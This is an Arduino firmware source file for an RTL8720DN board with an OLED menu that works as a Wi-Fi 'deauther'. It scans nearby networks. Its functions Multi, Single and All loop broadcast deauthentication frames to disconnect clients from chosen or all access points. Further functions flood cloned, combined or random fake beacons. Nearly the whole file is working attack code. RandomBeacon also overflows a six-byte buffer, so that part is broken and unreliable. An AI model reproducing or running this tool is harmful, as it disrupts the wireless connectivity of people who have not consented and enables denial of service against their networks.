//Code by Nguyen Thoai
#undef max
#undef min
#include "vector"
#include "map"
#include "wifi_conf.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "wifi_cust_tx.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include "bitmap.h"
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define BTN_DOWN PA13
#define BTN_UP PA14
#define BTN_BACK PA12
#define BTN_OK PB3
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
typedef struct {
    String ssid;
    String bssid_str;
    uint8_t bssid[6];
    short rssi;
    uint channel;
    rtw_security_t security_type;
    String security_str;
} WiFiScanResult;
bool Break = false;
char *ssid = "Ai-Thinker";
char *pass = "RTL8720DN";
int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
std::vector<int> SelectedVector;
uint8_t deauth_bssid[6];
uint8_t becaon_bssid[6];
uint16_t deauth_reason;
void CD();
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result);
int scanNetworks();
bool contains(std::vector<int>& vec, int value);
void addValue(std::vector<int>& vec, int value);
void drawssid();
void drawscan();
void MultiSelectionMenu();
void Multi();
void Single();
void All();
void BecaonDeauth();
void Becaon();
String generateRandomString(int len);
void RandomBeacon();
void selectedmenu(String text);
void drawattack();
void SelectionHandle(int state, int selection);
void bitmapload(const unsigned char* bitmapData);
void MenuHandle(int handle, int set);
void BecaonMenu();
void CD(){
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);
}
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
    rtw_scan_result_t *record;
    if (scan_result->scan_complete == 0) {
        record = &scan_result->ap_details;
        record->SSID.val[record->SSID.len] = 0;
        WiFiScanResult result;
        result.ssid = String((const char*) record->SSID.val);
        result.channel = record->channel;
        result.rssi = record->signal_strength;
        memcpy(&result.bssid, &record->BSSID, 6);
        char bssid_str[] = "XX:XX:XX:XX:XX:XX";
        snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
        result.bssid_str = bssid_str;
        result.security_type = record->security;
        switch (result.security_type) {
            case RTW_SECURITY_OPEN:
                result.security_str = "Open";
                break;
            case RTW_SECURITY_WPA_TKIP_PSK:
            case RTW_SECURITY_WPA_AES_PSK:
            case RTW_SECURITY_WPA_MIXED_PSK:
                result.security_str = "WPA-PSK";
                break;
            case RTW_SECURITY_WPA_WPA2_TKIP_PSK:
            case RTW_SECURITY_WPA_WPA2_AES_PSK:
            case RTW_SECURITY_WPA_WPA2_MIXED_PSK:
                result.security_str = "WPA/WPA2";
                break;
            case RTW_SECURITY_WPA2_TKIP_PSK:
            case RTW_SECURITY_WPA2_AES_PSK:
            case RTW_SECURITY_WPA2_MIXED_PSK:
                result.security_str = "WPA2-PSK";
                break;
            case RTW_SECURITY_WPA2_WPA3_MIXED:
                result.security_str = "WPA2/WPA3"; 
                break;
            case RTW_SECURITY_WPA3_AES_PSK:
                result.security_str = "WPA3-SAE";
                break;
            case RTW_SECURITY_UNKNOWN:
            default:
                result.security_str = "Unknown";
                break;
        }
        scan_results.push_back(result);
    }
    return RTW_SUCCESS;
}
int scanNetworks() {
     DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
    scan_results.clear();
    if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
        delay(5000);
         DEBUG_SER_PRINT(" done!\n");
        return 0;
    } else {
         DEBUG_SER_PRINT(" failed!\n");
        return 1;
    }
}
String SelectedSSID;
String SSIDCh;
void setup(){
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_OK, INPUT_PULLUP);
    pinMode(BTN_BACK, INPUT_PULLUP);
    Serial.begin(115200);
    if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
        Serial.println(F("SSD1306 init failed"));
        while (true);
    }
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(44, 20);
    display.println("Welcome");
    display.setCursor(29, 34);
    display.println("Nguyen Thoai");
    display.display();
    DEBUG_SER_INIT();
    WiFi.apbegin(ssid, pass, (char *) String(current_channel).c_str());
    if (scanNetworks() != 0) {
        while(true) delay(1000);
    }
     #ifdef DEBUG
     for (uint i = 0; i < scan_results.size(); i++) {
        DEBUG_SER_PRINT(scan_results[i].ssid + " ");
         for (int j = 0; j < 6; j++) {
             if (j > 0) DEBUG_SER_PRINT(":");
             DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
         }
         DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
        DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
     }
     #endif
    if (!scan_results.empty()) {
        SelectedSSID = scan_results[0].ssid;
        SSIDCh = scan_results[0].channel >= 36 ? "5.0GHz" : "2.4GHz";
    }
}
int attackstate = 0;
int menustate = 0;
bool menuscroll = true;
bool okstate = true;
int scrollindex = 0;
int perdeauth = 3;
unsigned long BPT = 0;
const unsigned long HTH = 800;
bool held = false;
bool contains(std::vector<int>& vec,int value){
    for (int v : vec){
        if(v==value){
            return true;
        }
    }
    return false;
}
void addValue(std::vector<int>& vec,int value){
    if(!contains(vec, value)){
        vec.push_back(value);
    } else{
        Serial.print(value);
        Serial.println("Exits");
        for (auto IT = vec.begin(); IT != vec.end();){
            if(*IT == value){
                IT=vec.erase(IT);
            }
            else{
                ++IT;
            }
        }
        Serial.println("De-selected");
    }
}
void drawssid(){
    while(true){
        if(digitalRead(BTN_BACK)==LOW){
            delay(300); 
            break;
        }
        if(digitalRead(BTN_DOWN)==LOW && digitalRead(BTN_UP)==LOW){
            delay(300); 
            break;
        }
        if(digitalRead(BTN_OK)==LOW){
            delay(300); 
            addValue(SelectedVector,scrollindex);
        }
        if(digitalRead(BTN_UP)==LOW){
            delay(300); 
            if(BPT==0){
                BPT = millis();
            }
            if(millis()-BPT >= HTH){
                if(!held){
                    held = true;
                }
            }
            if(scrollindex < scan_results.size() - 1){
                scrollindex++;
            }
            SelectedSSID = scan_results[scrollindex].ssid;
            SSIDCh = scan_results[scrollindex].channel >= 36 ? "5.0GHz" : "2.4GHz";
        }
        else{
            BPT = 0;
            if(held){
                held = false;
            }
        }
        if(digitalRead(BTN_DOWN)==LOW){
            delay(300);
            if(scrollindex > 0){
                scrollindex--;
            }
            SelectedSSID = scan_results[scrollindex].ssid;
            SSIDCh = scan_results[scrollindex].channel >= 36 ? "5.0GHz" : "2.4GHz";
        }
        display.clearDisplay();
        display.setTextSize(1);
        display.setTextColor(SSD1306_WHITE);
        display.setCursor(5, 22);
        if (SelectedSSID.length()==0){
            display.print("#HIDDEN#");
        }
        else if(SelectedSSID.length() > 13){
            SelectedSSID = SelectedSSID.substring(0,13) + "...";
            display.print(SelectedSSID);
        }
        else display.print(SelectedSSID);
        bool found = false;
        for(int i=0;i<SelectedVector.size();i++){
            if(SelectedVector[i]==scrollindex){
                found = true;
                break;
            }
        }
        if(found){
            display.setCursor(105, 22);
            display.println("[*]");
        }
        else{
            display.setCursor(105, 22);
            display.println("[ ]");
        }
        display.setCursor(87, 7);
        display.print(SSIDCh);
        display.setCursor(5, 7);
        display.print(String(scan_results[scrollindex].rssi) + "dBm");
        display.setCursor(5, 37);
        display.println(scan_results[scrollindex].security_str);
        display.setCursor(5, 52);
        display.println(scan_results[scrollindex].bssid_str);
        display.setCursor(105, 37);
        display.println(scan_results[scrollindex].channel);
        display.display();
    }
}
void drawscan(){
    while(true){
        display.clearDisplay();
        display.setTextColor(SSD1306_WHITE);
        display.setTextSize(1);
        display.setCursor(15, 28);
        display.print("Scanning Wifi Ap");
        display.display();
        scan_results.clear();
        if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
            delay(5000);
        } else {}
        Serial.print("Done");
        display.clearDisplay();
        display.setCursor(51, 28);
        display.print("Done");
        display.display();
        delay(500);
        break;
    }
}
void MultiSelectionMenu(){
    CD();
    if (SelectedVector.empty()) {
        display.setCursor(19, 28);
        display.println("No APs Selected");
        display.display();
        while(true){
            if(digitalRead(BTN_OK)==LOW || digitalRead(BTN_BACK)==LOW){
                delay(300);
                return;
            }
        }
    }
    int current_display_index = 0;
    int total_selected_aps = SelectedVector.size();
    while(true){
        if(digitalRead(BTN_BACK)==LOW){
            delay(300); 
            return;
        }
        if(digitalRead(BTN_OK)==LOW){
            delay(300); 
            Multi();
            return; 
        }
        if(digitalRead(BTN_UP)==LOW){
            delay(300); 
            if(current_display_index > 0){
                current_display_index--;
            }
        }
        if(digitalRead(BTN_DOWN)==LOW){
            delay(300); 
            if(current_display_index < total_selected_aps - 1){
                current_display_index++;
            }
        }
        display.clearDisplay();
        display.setCursor(5, 7);
        display.println("Selected APs");
        int selected_ap_original_index = SelectedVector[current_display_index];
        String ssid_to_display = scan_results[selected_ap_original_index].ssid;
        String bssid_to_display = scan_results[selected_ap_original_index].bssid_str;
        uint channel_to_display = scan_results[selected_ap_original_index].channel;
        String frequency_band = scan_results[selected_ap_original_index].channel >= 36 ? "5.0GHz" : "2.4GHz";
        display.setCursor(5, 22);
        if (ssid_to_display.length() == 0) {
            display.print("#HIDDEN#");
        } else if (ssid_to_display.length() > 16) {
            display.print(ssid_to_display.substring(0, 17) + "...");
        } else {
            display.print(ssid_to_display);
        }
        display.setCursor(5, 37);
        display.print(bssid_to_display);
        display.setCursor(89, 52);
        display.print(String(channel_to_display));
        display.setCursor(5, 52);
        display.print(frequency_band);
        display.setCursor(82, 7);
        display.print(String(current_display_index + 1) + "/" + String(total_selected_aps));
        display.display();
    }
}
void Multi(){
    CD();
    if (SelectedVector.empty()) {
        display.setCursor(19, 28);
        display.println("No APs Selected");
        display.display();
        while(true){
            if(digitalRead(BTN_OK)==LOW || digitalRead(BTN_BACK)==LOW){
                return; 
            }
        }
    }
    int num = 0;
    while(true){
        if(digitalRead(BTN_OK)==LOW || digitalRead(BTN_BACK)==LOW){ 
            break; 
        }
        if(SelectedVector.empty()){ 
             break;
        }
        int current_ap_index = SelectedVector[num];
        String current_ssid = scan_results[current_ap_index].ssid;
        String current_bssid = scan_results[current_ap_index].bssid_str;
        uint current_channel_num = scan_results[current_ap_index].channel;
        String frequency_band = scan_results[current_ap_index].channel >= 36 ? "5.0GHz" : "2.4GHz";
        display.clearDisplay();
        display.setCursor(38, 7); 
        display.println("Attacking");
        display.setCursor(5, 22);
        if (current_ssid.length() == 0) {
            display.print("#HIDDEN#");
        } else if (current_ssid.length() > 16) {
            display.print(current_ssid.substring(0, 17) + "...");
        } else {
            display.print(current_ssid);
        }
        display.setCursor(5, 37); 
        display.print(current_bssid);
        display.setCursor(89, 52); 
        display.print(String(current_channel_num));
        display.setCursor(5, 52); 
        display.print(frequency_band); 
        display.display();
        memcpy(deauth_bssid, scan_results[current_ap_index].bssid, 6);
        wext_set_channel(WLAN0_NAME, scan_results[current_ap_index].channel);
        for(int i = 0; i < 10; i++){
            wifi_tx_deauth_frame(deauth_bssid,(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",0);
            delay(5);
        }
        delay(50);
        num++;
        if(num >= SelectedVector.size()){
            num = 0;
        }
    }
}
void Single(){
    CD();
    if (scan_results.empty() || scrollindex < 0 || scrollindex >= scan_results.size()) {
        display.setCursor(19, 28);
        display.println("No APs Selected");
        display.display();
        while(true){
            if(digitalRead(BTN_OK)==LOW || digitalRead(BTN_BACK)==LOW){
                delay(300); 
                return; 
            }
        }
    }
    String current_ssid = scan_results[scrollindex].ssid;
    String current_bssid = scan_results[scrollindex].bssid_str;
    uint current_channel_num = scan_results[scrollindex].channel;
    while(true){
        if(digitalRead(BTN_OK)==LOW || digitalRead(BTN_BACK)==LOW){
            delay(300);
            break; 
        }
        display.clearDisplay();
        display.setCursor(5, 7);
        display.println("Single Attacking Wifi");
        display.setCursor(5, 22); 
        if (current_ssid.length() == 0) {
            display.print("#HIDDEN#");
        } else if (current_ssid.length() > 16) {
            display.print(current_ssid.substring(0, 13) + "...");
        } else {
            display.print(current_ssid);
        }
        display.setCursor(5, 37); 
        display.print(current_bssid);
        display.setCursor(5, 52); 
        display.print(String(current_channel_num));
        display.display();
        memcpy(deauth_bssid,scan_results[scrollindex].bssid,6);
        wext_set_channel(WLAN0_NAME,scan_results[scrollindex].channel);
        deauth_reason = 1;
        wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 4;
        wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 16;
        wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    }
}
void All(){
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);
    display.setCursor(10, 7);
    display.println("All Attacking Wifi");
    display.display();
    while (true){
        if(digitalRead(BTN_OK)==LOW || digitalRead(BTN_BACK)==LOW){
            break;
        }
        for(int i = 0; i<scan_results.size();i++){
            if(digitalRead(BTN_OK)==LOW || digitalRead(BTN_BACK)==LOW){
            break;
            }
            String current_ssid = scan_results[i].ssid;
            String current_bssid = scan_results[i].bssid_str;
            uint current_channel_num = scan_results[i].channel;
            String frequency_band = current_channel_num >= 36 ? "5.0GHz" : "2.4GHz";
            display.clearDisplay();
            display.setCursor(10, 7);
            display.println("All Attacking Wifi");
            display.setCursor(5, 22);
            if (current_ssid.length() == 0) {
                display.print("#HIDDEN#");
            } else if (current_ssid.length() > 16) {
                display.print(current_ssid.substring(0, 17) + "...");
            } else {
                display.print(current_ssid);
            }
            display.setCursor(5, 37);
            display.print(current_bssid);
            display.setCursor(89, 52); 
            display.print(String(current_channel_num));
            display.setCursor(5, 52); 
            display.print(frequency_band);
            display.display();
            memcpy(deauth_bssid,scan_results[i].bssid,6);
            wext_set_channel(WLAN0_NAME,scan_results[i].channel);
            for(int x=0;x < perdeauth; x++){
                deauth_reason = 1;
                wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
                deauth_reason = 4;
                wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
                deauth_reason = 16;
                wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            }
        }
    }
}
void BecaonDeauth(){
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(17, 28);
  display.println("Becaon Attacking");
  display.display();
  while(true){
    if(Break){
      Break = false;
      break;
    }
    for(int i = 0; i<scan_results.size();i++){
      if(digitalRead(BTN_OK)==LOW || digitalRead(BTN_BACK)==LOW){
      Break = true;
      break;
      }
      String ssid1 = scan_results[i].ssid;
      const char * ssid1_cstr =ssid1.c_str();
      memcpy(becaon_bssid,scan_results[i].bssid,6);
      memcpy(deauth_bssid,scan_results[i].bssid,6);
      wext_set_channel(WLAN0_NAME,scan_results[i].channel);
      for(int x=0;x < 10;x++){
        wifi_tx_beacon_frame(becaon_bssid,(void *) "\xFF\xFF\xFF\xFF\xFF\xFF",ssid1_cstr);
        wifi_tx_deauth_frame(deauth_bssid,(void *) "\xFF\xFF\xFF\xFF\xFF\xFF",0);
      }    
    }
  }
}
void Becaon(){
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(32, 28);
  display.println("Becaon Copy");
  display.display();
  while(true){
    if(Break){
      Break = false;
      break;
    }
    for(int i = 0; i<scan_results.size();i++){
      if(digitalRead(BTN_OK)==LOW || digitalRead(BTN_BACK)==LOW){
        Break = true;
        break;
      }
      String ssid1 = scan_results[i].ssid;
      const char * ssid1_cstr =ssid1.c_str();
      memcpy(becaon_bssid,scan_results[i].bssid,6);  
      wext_set_channel(WLAN0_NAME,scan_results[i].channel);
      for(int x=0;x < 10;x++){
        wifi_tx_beacon_frame(becaon_bssid,(void *) "\xFF\xFF\xFF\xFF\xFF\xFF",ssid1_cstr);
      }
    }    
  }
}
String generateRandomString(int len){
    String randstr = "";
    const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (int i = 0; i < len; i++){
        int index = random(0,strlen(setchar));
        randstr += setchar[index];
    }
    return randstr;
}
char randomString[6];
int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 36, 40, 44, 48, 100, 108, 149, 153, 157, 161};
void RandomBeacon(){
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(25, 28);
  display.println("Random Becaon");
  display.display();
  while (true){
    if(digitalRead(BTN_OK)==LOW || digitalRead(BTN_BACK)==LOW){
    Break = true;
    break;
    }
    int randomIndex = random(0, 19);
    int randomChannel = allChannels[randomIndex];
    String ssid2 = generateRandomString(10);
    for(int i=0;i<6;i++){
      byte randomByte = random(0x00, 0xFF);
      snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
    }
    const char * ssid_cstr2 = ssid2.c_str();
    wext_set_channel(WLAN0_NAME,randomChannel);
    for(int x=0;x<5;x++){
      wifi_tx_beacon_frame(randomString,(void *) "\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
    }
  }
}
void selectedmenu(String text){
    display.setTextColor(SSD1306_BLACK,SSD1306_WHITE);
    display.println(text);
    display.setTextColor(SSD1306_WHITE,SSD1306_BLACK);
}
void drawattack(){
    while(true){
        if(digitalRead(BTN_BACK)==LOW) {
            delay(300); 
            break;
        }
        if(digitalRead(BTN_OK)==LOW){
            delay(300); 
            SelectionHandle(attackstate, 1);
            break; 
        }
        if(digitalRead(BTN_DOWN)==LOW){
            delay(300); 
            if(attackstate > 0) attackstate--;
        }
        if(digitalRead(BTN_UP)==LOW){
            delay(300); 
            if(attackstate < 4) attackstate++;
        }
        MenuHandle(attackstate,1);
    }
}
void SelectionHandle(int state,int selection){
    switch(selection){
        case 0: 
            switch(state){
                case 0: drawattack(); break;
                case 1: drawscan(); break;
                case 2: drawssid(); break;
            }
            break;
        case 1: 
            switch(state){
                case 0: MultiSelectionMenu(); break; 
                case 1: All(); break;
                case 2: BecaonMenu(); break;
                case 3: BecaonDeauth(); break;
                case 4: return; 
            }
            break;
        case 2: 
            switch(state){
                case 0: RandomBeacon(); break;
                case 1: Becaon(); break;
                case 2: return; 
            }
            break;
    }
}
void bitmapload(const unsigned char* bitmapData){
    display.drawBitmap(0 ,0 ,bitmapData,128,64,WHITE);
    display.display();
}

void MenuHandle(int handle,int set){
    display.clearDisplay();
    display.setTextSize(1);
    delay(110); 
    switch(set){
        case 0:
            switch(handle){
                case 0:
                    bitmapload(Bit_deauther_logo_attack);
                    break;
                case 1:
                    bitmapload(Bit_deauther_logo_Scan);
                    break;
                case 2:
                    bitmapload(Bit_deauther_logo_Select);
                    break;
            }
            break;
        case 1: 
            switch(handle){
                case 0:
                    bitmapload(Bit_deauther_Deauth);
                    break;
                case 1:
                    bitmapload(Bit_deauther_All);
                    break;
                case 2:
                    bitmapload(Bit_deauther_Becaon);
                    break;
                case 3:
                    bitmapload(Bit_deauther_BeccaonDeauth);
                    break;
                case 4:
                    bitmapload(Bit_deauther_back2);
                    break;
            }
            break;
        case 2: 
            switch(handle){
                case 0:
                    bitmapload(Bit_deauther_Random);
                    break;
                case 1:
                    bitmapload(Bit_deauther_copyap);
                    break;
                case 2:
                    bitmapload(Bit_deauther_BecaonBack);
                    break;
            }
            break;
    }
}

int becaonstate = 0;
void BecaonMenu(){
    while(true){
        if(digitalRead(BTN_BACK)==LOW){
            delay(300);
            break;
        }
        if(digitalRead(BTN_OK)==LOW){
            delay(300); 
            SelectionHandle(becaonstate,2);
            break; 
        }
        if(digitalRead(BTN_DOWN)==LOW){
            delay(300); 
            if(becaonstate > 0) becaonstate--;
        }
        if(digitalRead(BTN_UP)==LOW){
            delay(300); 
            if(becaonstate < 2) becaonstate++;
        }
        MenuHandle(becaonstate,2);
    }
}

void loop(){
    MenuHandle(menustate,0);
    if(digitalRead(BTN_OK)==LOW){
        delay(300);
        if(okstate) SelectionHandle(menustate,0);
    }
    if(digitalRead(BTN_DOWN)==LOW){
        delay(300);
        if(menuscroll && menustate > 0) menustate--;
    }
    if(digitalRead(BTN_UP)==LOW){
        delay(300);
        if(menuscroll && menustate < 2) menustate++;
    }
}
